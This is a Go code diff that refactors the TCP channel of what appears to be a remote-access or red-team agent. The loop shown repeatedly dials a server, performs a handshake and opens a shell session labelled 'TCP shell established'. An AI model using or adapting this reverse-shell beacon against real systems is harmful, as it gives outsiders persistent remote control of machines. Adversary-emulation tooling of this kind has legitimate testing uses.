@@ -12,20 +12,27 @@ import (
 	"../output"
 )
 
+//TCP communication
+type TCP struct {}
+
+func init() {
+	CommunicationChannels["tcp"] = TCP{}
+}
+
 var shellInfo, paw, httpServer, terminalKey string
 
-//ListenTCP through a new socket connection
-func ListenTCP(key string, port string, server string, profile string) {
+//Listen through a new socket connection
+func (contact TCP) Listen(key string, port string, server string, profile string) {
 	httpServer = server
 	shellInfo = profile
 	terminalKey = key
 	for {
 	   conn, err := net.Dial("tcp", port)
 	   if err != nil {
-		  fmt.Println(fmt.Sprintf("[-] %s", err))
+		  output.VerbosePrint(fmt.Sprintf("[-] %s", err))
 	   } else {
 		   paw := handshake(conn)
-		   output.VerbosePrint(fmt.Sprintf("[+] TCP shell established for %s", paw))
+		   output.VerbosePrint("[+] TCP established")
 		   listen(conn, []byte(fmt.Sprintf("%s$", paw)))
 	   }
 	   time.Sleep(5 * time.Second)
